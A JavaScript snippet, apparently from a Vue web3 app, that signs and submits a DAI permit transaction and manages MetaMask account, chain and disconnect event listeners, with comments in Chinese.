//executePermit(walletClient, domain, address, spender, nonce, deadline);  FROM VUE COMPONENT
const executePermit = async (walletClient, domain, address, spender, nonce, deadline) => {
	try {
		const { v, r, s } = await this.signDaiPermit(walletClient, domain, address, spender, nonce, deadline, false)
		return await walletClient.writeContract({
			...this.contract,
			account: address,
			abi: this.DAI_PERMIT_ABI,
			functionName: 'permit',
			args: [address, spender, BigInt(nonce), BigInt(deadline), false, Number(v), r, s],
			chain: walletClient.chain,
		})
	} catch (error) {
		console.error('Error executing permit:', error)
		throw error
	}
}

export const signDaiPermit = async (walletClient, domain, holder, spender, nonce, expiry, allowed) => {
	const account = await this.getWalletAddress(walletClient)

	const types = {
		Permit: [
			{ name: 'holder', type: 'address' },
			{ name: 'spender', type: 'address' },
			{ name: 'nonce', type: 'uint256' },
			{ name: 'expiry', type: 'uint256' },
			{ name: 'allowed', type: 'bool' },
		],
	}

	const signatureHex = await walletClient.signTypedData({
		account,
		domain,
		types,
		primaryType: 'Permit',
		message: { holder, spender, nonce, expiry, allowed },
	})

	return this.hexToSignature(signatureHex)
}

// 小狐狸MetaMask的事件监听
const events = {
	accountsChanged(accounts) {
		// 指的是此页面连接的账户，连接小狐狸后再切换账户，此事件才会触发
		console.log('切换了账户', accounts)
		const web3Store = useWeb3Store()
		web3Store.onInit()
		// web3Store.accounts.value = accounts
		// showToast('已切换钱包账户')
		const obj = {
			id: 0,
			currency: '',
			currencyCode: '',
			fullName: '',
			picUrl: '',
			isRecharge: false,
			isWithdraw: false,
			isExchange: false,
			protocols: null,
			handlingFee: 0,
			isOpenOnlineRecharge: false,
			isOpenQuickPay: false,
			sortBy: 0,
			usd: 0,
			picUrlStr: '',
		}
		router.push('/')
		useWeb3Store()
		localStorage.setItem('currentCurrency', JSON.stringify(obj))
		window.location.reload()
	},
	chainChanged(chainId) {
		// 16转10进制
		// chainId = parseInt(chainId, 16)
		console.log('切换了链', chainId)
	},
	connect(connectInfo) {
		console.log('连接合约成功', connectInfo)
	},
	disconnect(error) {
		console.log('断开连接', error)
		// showToast('已断开钱包账户')
		const obj = {
			id: 0,
			currency: '',
			currencyCode: '',
			fullName: '',
			picUrl: '',
			isRecharge: false,
			isWithdraw: false,
			isExchange: false,
			protocols: null,
			handlingFee: 0,
			isOpenOnlineRecharge: false,
			isOpenQuickPay: false,
			sortBy: 0,
			usd: 0,
			picUrlStr: '',
		}
		router.push('/')
		localStorage.setItem('currentCurrency', JSON.stringify(obj))
		window.location.reload()
	},
	message(message) {
		console.log('一些消息', message)
	},
}

// 添加小狐狸的事件监听
function addEvent() {
	console.log('addEvent--')
	if (!window.ethereum) return [false, '钱包未正常启用']
	window.ethereum.on('accountsChanged', events.accountsChanged)
	window.ethereum.on('chainChanged', events.chainChanged)
	window.ethereum.on('connect', events.connect)
	window.ethereum.on('disconnect', events.disconnect)
	window.ethereum.on('message', events.message)
	return
}

// 移除小狐狸的事件监听
function removeEvent() {
	console.log('removeEvent--')
	if (!window.ethereum) return
	window.ethereum.removeListener('accountsChanged', events.accountsChanged)
	window.ethereum.removeListener('chainChanged', events.chainChanged)
	window.ethereum.removeListener('connect', events.connect)
	window.ethereum.removeListener('disconnect', events.disconnect)
	window.ethereum.removeListener('message', events.message)
}
